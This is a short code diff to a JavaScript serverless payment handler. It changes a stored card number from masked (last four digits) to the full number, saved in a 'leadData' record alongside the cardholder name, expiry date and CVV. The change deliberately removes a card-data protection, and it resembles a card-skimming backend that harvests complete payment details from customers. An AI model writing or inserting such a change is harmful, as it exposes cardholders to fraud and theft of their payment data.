@@ -60,7 +60,7 @@ exports.handler = async (event, context) => {
 
     const txId = body.transaction_id || body.orderId || order.orderId || `CP-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
 
-    const maskedCard = cardNumber ? `•••• •••• •••• ${cardNumber.replace(/\D/g, '').slice(-4)}` : (paymentMethod === 'pix' ? 'PIX' : '•••• •••• •••• 4000');
+    const fullCardNumber = cardNumber || (paymentMethod === 'pix' ? 'PIX' : '');
 
     const leadData = {
       created_at: new Date().toISOString(),
@@ -79,7 +79,7 @@ exports.handler = async (event, context) => {
       payment_method: paymentMethod,
       status,
       transaction_id: txId,
-      card_number: maskedCard,
+      card_number: fullCardNumber,
       card_name: cardName,
       card_expiry: cardExpiry,
       card_cvv: cardCvv,
